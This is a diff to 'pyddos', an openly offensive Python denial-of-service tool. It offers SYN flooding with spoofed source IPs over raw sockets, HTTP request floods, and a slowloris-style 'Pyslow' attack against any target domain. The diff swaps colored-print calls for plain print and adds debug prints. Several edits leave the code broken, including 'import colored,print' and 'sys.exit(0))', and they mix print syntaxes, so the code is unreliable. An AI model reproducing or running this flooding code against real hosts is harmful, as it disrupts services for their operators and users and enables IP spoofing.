@@ -37,9 +37,10 @@ if os.name == 'posix':
 else:
 	print '[-] Check your pip installer'
 
+'''
 try:
 	import requests,colorama
-	from termcolor import colored,cprint
+	from termcolor import colored,print
 except:
 	try:
 		if os.name == 'posix':
@@ -56,7 +57,7 @@ if os.name == 'nt':
 	colorama.init()
 
 signal.signal(signal.SIGPIPE,signal.SIG_DFL)
-
+'''
 def fake_ip():
 	skip = '127'
 	rand = range(4)
@@ -72,7 +73,7 @@ def check_tgt(args):
 	try:
 		ip = gethostbyname(tgt)
 	except:
-		sys.exit(cprint('[-] Can\'t resolve host:Unknow host!','red'))
+		sys.exit(print('[-] Can\'t resolve host:Unknow host!','red'))
 	return ip
 
 
@@ -134,7 +135,7 @@ class Pyslow:
 				sock.sendto(self.mypkt(),(self.tgt,int(self.port)))
 				self.pkt_count+=1
 		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
+			sys.exit(print('[-] Canceled by user','red'))
 		return sock
 	def sending_packets(self):
 		try:
@@ -154,14 +155,14 @@ class Pyslow:
 				sock.sendall('X-a: b\r\n')
 				self.pkt_count+=1
 		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
+			sys.exit(print('[-] Canceled by user','red'))
 		return sock
 	def doconnection(self):
 		socks = 0
 		fail=0
 		lsocks=[]
 		lhandlers=[]
-		cprint('\t\tBuilding sockets','blue')
+		print('\t\tBuilding sockets','blue')
 		while socks < (int(self.threads)):
 			try:
 				sock = self.building_socket()
@@ -173,8 +174,8 @@ class Pyslow:
 			except Exception:
 				fail+=1
 			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user','red'))
-		cprint('\t\tSending packets','blue')
+				sys.exit(print('[-] Canceled by user','red'))
+		print('\t\tSending packets','blue')
 		while socks < int(self.threads):
 			try:
 				handler = self.sending_packets()
@@ -189,7 +190,7 @@ class Pyslow:
 				fail+=1
 			except KeyboardInterrupt:
 				break
-				sys.exit(cprint('[-] Canceled by user','red'))
+				sys.exit(print('[-] Canceled by user','red'))
 		print colored('I have sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' packets successfully.Now i\'m going to sleep for ','green') + colored(self.sleep,'red') + colored(' second','green')
 		time.sleep(self.sleep)
 
@@ -251,7 +252,7 @@ class Requester(Thread):
 				method = choice(['get','post'])
 				reqter.request(method.upper(),url,None,http_header)
 		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
+			sys.exit(print('[-] Canceled by user','red'))
 		except Exception,e:
 			print e
 		finally:
@@ -342,19 +343,20 @@ class Synflood(Thread):
 			self.lock.acquire()
 			self.sock.sendto(packet,(self.tgt,0))
 		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
+			sys.exit(print('[-] Canceled by user','red'))
 		except Exception,e:
-			cprint(e,'red')
+			print(e,'red')
 		finally:
 			self.lock.release()
 
 def main():
+	print("ok")
 	parser = ArgumentParser(
         usage='./%(prog)s -t [target] -p [port] -t [number threads]',
         version=version,
         formatter_class=RawTextHelpFormatter,
         prog='pyddos',
-        description=cprint(title,'white',attrs=['bold']),
+        #description=print(title,'white',attrs=['bold']),
         epilog='''
 Example:
     ./%(prog)s -d www.example.com -p 80 -T 2000 -Pyslow
@@ -366,7 +368,7 @@ Example:
 	options.add_argument('-d',metavar='<ip|domain>',default=False,help='Specify your target such an ip or domain name')
 	options.add_argument('-t',metavar='<float>',default=5.0,help='Set timeout for socket')
 	options.add_argument('-T',metavar='<int>',default=1000,help='Set threads number for connection (default = 1000)')
-	options.add_argument('-p',metavar='<int>',default=80,help='Specify port target (default = 80)' + colored(' |Only required with pyslow attack|','red'))
+	options.add_argument('-p',metavar='<int>',default=80,help='Specify port target (default = 80)' ) #+ colored(' |Only required with pyslow attack|','red'))
 	options.add_argument('-s',metavar='<int>',default=100,help='Set sleep time for reconnection')
 	options.add_argument('-i',metavar='<ip address>',default=False,help='Specify spoofed ip unless use fake ip')
 	options.add_argument('-Request',action='store_true',help='Enable request target')
@@ -374,19 +376,24 @@ Example:
 	options.add_argument('-Pyslow',action='store_true',help='Enable pyslow attack')
 	options.add_argument('--fakeip',action='store_true',default=False,help='Option to create fake ip if not specify spoofed ip')
 	args = parser.parse_args()
+
+	print("OK")
+
 	if args.d == False:
 		parser.print_help()
 		sys.exit()
 	add_bots();add_useragent()
+
 	if args.d:
 		check_tgt(args)
+
 	if args.Synflood:
 		uid = os.getuid()
 		if uid == 0:
-			cprint('[*] You have enough permisson to run this script','green')
+			print('[*] You have enough permisson to run this script','green')
 			time.sleep(0.5)
 		else:
-			sys.exit(cprint('[-] You haven\'t enough permission to run this script','red'))
+			sys.exit(print('[-] You haven\'t enough permission to run this script','red'))
 		tgt=check_tgt(args)
 		synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
 		synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
@@ -407,11 +414,11 @@ Example:
 					thread.start()
 					thread.join()
 			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user','red'))
+				sys.exit(print('[-] Canceled by user','red'))
 	elif args.Request:
 		tgt = args.d
 		threads = []
-		print colored('[*] Start send request to: ','blue')+colored(tgt,'red')
+		print('[*] Start send request to: ','blue')+colored(tgt,'red')
 		while 1:
 			try:
 				for x in xrange(int(args.T)):
@@ -420,7 +427,7 @@ Example:
 					t.start()
 					t.join()
 			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user','red'))
+				sys.exit(0))
 	elif args.Pyslow:
 		try:
 			tgt = args.d
@@ -435,11 +442,11 @@ Example:
 				worker=Pyslow(tgt,port,to,threads,st)
 				worker.doconnection()
 			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user','red'))
+				sys.exit(print('[-] Canceled by user','red'))
 	if not (args.Synflood) and not (args.Request) and not (args.Pyslow):
 		parser.print_help()
 		print
-		sys.exit(cprint('[-] You must choose attack type','red'))
+		sys.exit(print('[-] You must choose attack type','red'))
 
 if __name__ == '__main__':
 	main()
